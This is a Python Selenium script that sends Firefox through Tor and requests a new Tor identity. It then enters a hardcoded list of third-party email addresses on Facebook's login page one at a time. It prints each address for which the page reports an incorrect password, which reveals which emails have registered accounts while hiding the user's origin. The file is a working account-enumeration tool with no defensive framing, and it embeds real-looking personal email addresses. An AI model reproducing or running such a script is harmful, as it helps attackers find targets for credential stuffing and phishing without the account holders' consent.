from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from time import sleep
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
import os
from stem import Signal
from stem.control import Controller
from selenium.webdriver.common.keys import Keys
import extract_html_diff

torexe = os.popen(r'C:\Users\User\Desktop\Tor Browser\Browser\firefox')
profile = FirefoxProfile(r'C:\Users\User\Desktop\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default')


with Controller.from_port(port=9051) as controller:
  controller.authenticate(password="mypassword")  ##this will be different!
  controller.signal(Signal.NEWNYM)

for i in ["superman@gmail.com", "ccohen@aol.com", "keijser@aol.com", "superman@gmail.com", "ajohnson@hotmail.com", "rnewman@aol.com", "sfoskett@hotmail.com", "seurat@aol.com", "richard@gmail.com", "punkis@gmail.com", "jadavis@outlook.com", "staffelb@att.net", "pplinux@icloud.com", "lamky@optonline.net", "ccoerhen@aol.com", "keijserqer@aol.com", "ajohneesdson@hotmail.com", "rnewman@aol.com", "sfosksdett@hotmail.com", "seusdrat@aol.com", "richard@gmail.com", "pssunkis@gmail.com", "jadavssis@outlook.com", "stafssfelb@att.net", "pplinsdux@icloud.com", "laamky@optonline.net"]:
#for i in ["superman"]:

    user = i

    myProxy = "127.0.0.1:9150"
    ip, port = myProxy.split(":")
    driver = webdriver.FirefoxProfile()
    driver.set_preference('network.proxy.type', 1)
    driver.set_preference('network.proxy.socks', ip)
    driver.set_preference('network.proxy.socks_port', int(port))
    options = Options()
    options.headless = True
    #driver = webdriver.Firefox(options=options)
    driver = webdriver.Firefox(driver)

    driver.get("https://www.facebook.com/")

    elem = driver.find_element_by_xpath("//input[@type='text']")  # type = 'text'/'email'
    elem.send_keys(user)
    # elem = driver.find_element_by_xpath("//input[@type='password']")
    # elem.send_keys(passw)
    elem.send_keys(Keys.RETURN)
    sleep(3)  # sleep important here in case of facebook, cause correct username authentication takes some time to load
    p1 = driver.page_source
    # if "The password you’ve entered is incorrect. " in p1:
    if "The password you’ve entered is incorrect." in p1:
        print(i)
    sleep(3)
